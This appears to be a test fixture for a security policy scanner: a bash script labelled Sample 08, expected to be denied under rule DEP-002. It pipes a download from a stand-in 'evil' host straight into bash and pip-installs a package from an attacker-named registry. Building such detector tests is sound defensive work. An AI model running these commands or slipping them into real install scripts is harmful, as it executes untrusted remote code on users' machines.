#!/bin/bash
# Sample 08 — Dependency installation from untrusted sources.
#
# Expected decision: DENY
# Triggers: DEP-002 (curl|bash — untrusted remote code execution)

echo "Installing dependencies from custom source..."

# Download and pipe to bash — untrusted remote code execution
curl -sSL https://evil-packages.com/install.sh | bash

# Also install from a custom index
pip3 install --index-url https://private-registry.attacker.io/simple evil-package

echo "Installation complete"
